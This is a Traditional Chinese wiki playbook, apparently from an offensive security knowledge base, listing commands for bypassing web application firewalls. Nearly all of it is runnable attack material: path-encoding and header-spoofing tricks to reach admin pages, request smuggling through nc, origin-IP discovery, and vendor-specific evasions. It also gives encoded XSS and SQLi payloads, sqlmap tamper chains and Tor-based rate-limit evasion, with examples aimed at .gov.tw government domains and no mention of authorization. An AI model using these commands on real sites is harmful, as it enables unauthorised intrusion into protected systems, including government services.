---
type: wiki
category: playbook
status: active
last-updated: 2026-04-21
---

# WAF Bypass 指令速查（實戰用）

> 快速查找「這個 WAF 擋了，用什麼手法繞？」的指令手冊。
> 搭配 `tools/hunters/hunt-waf-bypass.sh` 自動化。
> 詳細理論見 [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md)。

## 自動化（一鍵試所有 bypass）

```bash
tools/hunters/hunt-waf-bypass.sh https://target.com

# 只測特定路徑
PATHS='/admin,/api/users,/.env' tools/hunters/hunt-waf-bypass.sh https://target.com

# 已知 origin IP 時
ORIGIN_IP=1.2.3.4 tools/hunters/hunt-waf-bypass.sh https://target.com
```

輸出會標記哪些 bypass 技巧成功（`🟢 [BYPASS:xxx]`）。

## 手動 bypass 指令一覽

### 1. Path 層面

```bash
# Case variation（很多 WAF case-sensitive）
curl "https://target/APi/users"
curl "https://target/aDmIn"

# Trailing slash / double slash
curl "https://target/admin/"
curl "https://target//admin"
curl "https://target/admin/."
curl "https://target/./admin"

# Semicolon / percent-null / percent-tab
curl "https://target/admin;"
curl "https://target/admin%00"
curl "https://target/admin%00.html"
curl "https://target/admin%09"
curl "https://target/admin%20"
curl "https://target/admin%2e"

# Double URL encoding
curl "https://target/%2561dmin"     # %25 = %, %61 = a → %61 = a
curl "https://target/%252e%252e/"

# Fragment suffix
curl "https://target/admin#/"
curl "https://target/admin?x=1#/"

# Unicode normalization
curl "https://target/%C0%AE%C0%AE/"  # overlong UTF-8 for ..
```

### 2. Header 層面

```bash
# X-Original-URL / X-Rewrite-URL (Apache mod_rewrite / Spring)
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Rewrite-URL: /admin" https://target/

# X-Forwarded-For spoof
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -H "X-Forwarded-For: localhost" https://target/admin
curl -H "X-Forwarded-For: 192.168.0.1" https://target/admin
curl -H "X-Real-IP: 127.0.0.1" https://target/admin
curl -H "X-Remote-Addr: 127.0.0.1" https://target/admin
curl -H "X-Client-IP: 127.0.0.1" https://target/admin
curl -H "X-Originating-IP: 127.0.0.1" https://target/admin

# CDN 特殊 header
curl -H "CF-Connecting-IP: 127.0.0.1" https://target/admin  # Cloudflare
curl -H "True-Client-IP: 127.0.0.1" https://target/admin    # Akamai
curl -H "X-Azure-ClientIP: 127.0.0.1" https://target/admin  # Azure

# Host header 繞過
curl -H "Host: localhost" https://target/admin
curl -H "Host: admin.target.com" https://target/
curl -H "X-Original-Host: admin.target.com" https://target/
curl -H "X-Host: admin.target.com" https://target/
curl -H "X-Forwarded-Host: admin.target.com" https://target/

# Content-Type 切換
curl -H "Content-Type: application/xml" -X POST -d '<x/>' https://target/api  # 原本 JSON
curl -H "Content-Type: text/plain" -X POST -d 'data' https://target/api
```

### 3. HTTP 方法切換

```bash
# 多數 WAF 只 filter GET/POST
curl -X OPTIONS https://target/admin
curl -X HEAD https://target/admin
curl -X PATCH https://target/admin
curl -X PURGE https://target/admin
curl -X TRACE https://target/         # 若啟用 → reflected
curl -X CONNECT https://target/
curl -X DEBUG https://target/         # ASP.NET 專用
```

### 4. HTTP 版本切換

```bash
curl --http1.0 https://target/admin
curl --http1.1 https://target/admin
curl --http2 https://target/admin
curl --http3 https://target/admin   # 需 QUIC 支援

# HTTP/2 smuggling（老 WAF 只看 HTTP/1.1）
nghttp https://target/admin
h2load -n 1 https://target/admin
```

### 5. Chunked encoding / smuggling

```bash
# 基本 chunked
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n' | nc target 80

# CL.TE desync
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | nc target 80

# 用 smuggler.py 自動化
python3 smuggler.py -u https://target -v
```

### 6. 直連 Origin IP（最有效）

```bash
# 1. 先找 origin IP（不依賴 target.com DNS）
# crt.sh 歷史憑證
curl -s 'https://crt.sh/?q=%25.target.gov.tw&output=json' \
  | jq -r '.[].name_value' | sort -u

# Shodan 憑證 hash
shodan search 'ssl.cert.subject.cn:"target.gov.tw"'

# DNS 歷史
curl -s "https://api.viewdns.info/iphistory/?domain=target.gov.tw&apikey=xxx&output=json"

# Censys
censys search "parsed.subject.common_name: target.gov.tw"

# 2. 找到候選 IP (e.g. 1.2.3.4) 後直連
curl -sk -H "Host: target.gov.tw" https://1.2.3.4/admin
curl -sk --resolve target.gov.tw:443:1.2.3.4 https://target.gov.tw/admin

# 3. 驗證是同一個後端（body 一致 → 確定是 origin）
diff <(curl -sk https://target.gov.tw/) <(curl -sk -H "Host: target.gov.tw" https://1.2.3.4/)
```

### 7. 非標準 port

```bash
# rustscan 一鍵
rustscan -a target.gov.tw --ulimit 5000 -- -sV

# 常被忽略的 port
curl https://target.gov.tw:8080/admin
curl https://target.gov.tw:8443/admin
curl https://target.gov.tw:8888/admin
curl https://target.gov.tw:9090/admin
curl https://target.gov.tw:7001/console    # WebLogic

# 若 port 回應是 direct origin（沒經過 WAF）
nmap -sV -p- target.gov.tw --top-ports 1000
```

### 8. 子域名旁路

```bash
# 產出候選
subfinder -d target.gov.tw -silent | grep -iE "dev|uat|test|stage|beta|demo|sandbox|internal|old" > non_prod.txt

# 對每個看是否同後端
while read -r sub; do
  echo "$sub"
  curl -sk "https://$sub/admin" -o /dev/null -w "%{http_code}\n"
done < non_prod.txt
```

### 9. WAF 特定 bypass

#### Cloudflare

```bash
# __cf_bm cookie 通過 JS challenge 後可複用 30 分鐘
curl -sIk https://target/ 2>&1 | grep -i "cf-ray"  # 確認是 CF

# 用 cloudscraper
pip3 install cloudscraper
python3 -c "
import cloudscraper
r = cloudscraper.create_scraper().get('https://target/admin')
print(r.text)
"

# 用 undetected-chromedriver 或 FlareSolverr
docker run -d -p 8191:8191 ghcr.io/flaresolverr/flaresolverr:latest
```

#### Akamai

```bash
# Akamai 對 regex 激進，試 payload 分段
# 原始 payload: <script>alert(1)</script>
# 分段 bypass:
curl "https://target/?a=<scr&b=ipt>alert(1)"  # 若後端 concat 前 reassemble

# Case variation 特別有效
curl "https://target/?q=%3cScRiPt%3e"

# 用 Akamai CDN 之外的 subdomain（e.g. 客戶自 host 的 static CDN）
```

#### Imperva Incapsula

```bash
# Incapsula 只保護 DNS，後端 IP 很常公開
# 找 origin IP 是最有效的繞法
```

#### AWS WAF

```bash
# 看 X-Amz-Cf-Id → 是 CloudFront
curl -sI https://target/ | grep -i x-amz

# AWS WAF rate-based rule 只對 IP 計算
# → 換 IP / 用 Tor / 改 X-Forwarded-For 無效
# → 但 Managed rules 可能對 payload 字串敏感
```

#### 雷池 SafeLine

```bash
# 識別：response header 有 waf.chaitin 或 x-waf: SafeLine-CE
# 繞法：
# 1. 雷池對 HTTP/2 處理較新 — 試 --http2
# 2. 雷池 default rule 較寬，客製 rule 才嚴格
# 3. 很多客戶只擋了前端，後端 IP 可直連
```

### 10. sqlmap / nuclei 繞 WAF

```bash
# sqlmap tamper 腳本
sqlmap -u 'https://target/page.php?id=1' \
  --tamper=between,randomcase,space2comment,charencode \
  --random-agent --delay 3 --timeout 30 -v 1

# 常用 tamper 組合
# MySQL: between,randomcase,space2mysqlblank,charunicodeencode
# MSSQL: between,randomcase,space2mssqlblank,equaltolike
# Oracle: between,randomcase,space2comment
# WAF heavy: versionedmorekeywords,versionedkeywords,space2mysqlhash

# nuclei 低噪音
nuclei -u https://target \
  -rate-limit 5 \
  -c 5 \
  -timeout 15 \
  -retries 1 \
  -H "X-Forwarded-For: 127.0.0.1" \
  -severity high,critical
```

### 11. 用 TLS 指紋繞

```bash
# 有些 WAF 用 TLS JA3 fingerprint 識別 Python/curl/Go
# 用 curl-impersonate（偽裝 Chrome/Firefox 的 JA3）
docker run -v $PWD:/out lwthiker/curl-impersonate \
  curl_chrome116 https://target/admin -o /out/resp.html

# 或用 cycletls / utls
```

### 12. Payload 編碼

```bash
# XSS
原始: <script>alert(1)</script>

# HTML entity
"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;"

# JavaScript unicode
"\u003cscript\u003ealert(1)\u003c/script\u003e"

# Char escape
"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"

# Template literal（ES6）
"${alert(1)}"

# SVG / embed / 無 script tag
"<svg onload=alert(1)>"
"<img src=x onerror=alert(1)>"
"<iframe src=javascript:alert(1)>"

# SQLi
' OR '1'='1              → 常擋
'/**/OR/**/'1'='1       → 空白用 comment
' OR '1'=`1`             → backtick 有時繞
' %09OR%09 '1'='1        → tab
```

### 13. 用 Burp Caido 手動測

```bash
# Burp Intruder → payload position
# → payload set: simple list / recursive grep
# → Grep match: "Error" / "Forbidden"

# Caido Automate tab 類似
```

### 14. Rate limit 繞

```bash
# 每 IP 限制 → 換 IP
curl --proxy socks5://127.0.0.1:9050 https://target  # Tor
curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))"    # 隨機

# 加入 delay
for i in {1..100}; do
  curl https://target/api?id=$i
  sleep 2  # 避開 rate-based
done
```

## Checklist（每個目標都跑一次）

- [ ] wafw00f 識別 WAF 廠商
- [ ] `hunt-waf-bypass.sh` 自動測 15+ 技巧
- [ ] crt.sh / Shodan 找 origin IP
- [ ] subfinder 找 non-prod 子域名
- [ ] rustscan 找非標準 port
- [ ] 若找到 origin → 重跑所有 hunter（`--resolve target:443:IP`）
- [ ] 若無法繞 → 低速率模式（`-rate-limit 5 -c 5`）

## 關聯文件

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — 理論與策略
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [22-tool-subfinder-httpx.md](22-tool-subfinder-httpx.md)
